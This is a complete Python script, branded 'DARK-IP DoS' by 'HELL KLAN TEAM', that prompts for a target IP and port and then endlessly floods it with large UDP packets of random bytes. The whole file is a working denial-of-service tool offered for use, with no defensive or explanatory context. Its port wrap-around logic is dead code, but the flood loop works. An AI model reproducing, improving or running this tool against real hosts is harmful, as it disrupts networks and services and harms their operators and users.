import os
import socket
import time
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
timeout = time.time()
bytes = random._urandom(10000)
os.system("clear")
os.system("figlet DARK-IP DoS")
time.sleep(1)
print("DARK-Ip DoS'ing Tool by HELL KLAN TEAM")
print()
time.sleep(1)
IP = input("Target IP: ")
Port = int(input("Target Port: "))
while True:
    while 1:
       if time.time() > timeout:
           break
       else:
         pass
    sock.sendto(bytes, (IP, Port))
    print("SENDING ATTACK BY HELL KLAN KORPS! TO STOP PRESS CTRL + C")
    if Port == 65500:
     Port = 1
